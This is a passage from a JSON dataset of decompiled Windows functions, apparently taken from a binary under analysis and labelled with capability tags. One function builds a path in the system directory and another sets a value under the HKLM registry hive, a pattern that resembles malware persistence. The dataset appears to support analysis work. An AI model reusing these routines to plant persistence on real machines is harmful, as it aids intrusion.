 for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    cVar9 = '\\0';\n    uVar1 = puVar4 + 3 | 0x61be;\n    cVar8 = uVar1 < 0;\n    uVar6 = uVar1 == 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_10ch, 0x406024, &lpBuffer, arg_8h);\n    if ((uVar6 || cVar9 != cVar8) || (arg_ch = extraout_ECX,  !uVar6 && cVar9 == cVar8)) {\n        arg_ch = &uStack12;\n    }\n    fcn.00404400(&uStack8, arg_ch);\n    bVar5 = false;\n    bVar7 = (extraout_DX - 1U & extraout_CX) == 0;\n    fcn.00404650(uStack8);\n    puVar3 = &stack0xfffffffc;\n    if ((!bVar5 && !bVar7) && (puVar3 = &stack0xfffffffc,  bVar5 || bVar7)) {\n        *(puVar4 + 3) = *unaff_ESI;\n        uStack12 = extraout_ECX_00;\n        puVar3 = 0x8be181cf;\n    }\n    iVar2 = fcn.00402f90(puVar3 + -0x10c, 0x406044, *(puVar3 + -4), uStack12, 1);\n    if (iVar2 != 0) {\n        fcn.00401f60(puVar3 + -0x10c);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 771
    },
    "00403000": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403000(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x406204, 0x406248, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 77
    }
}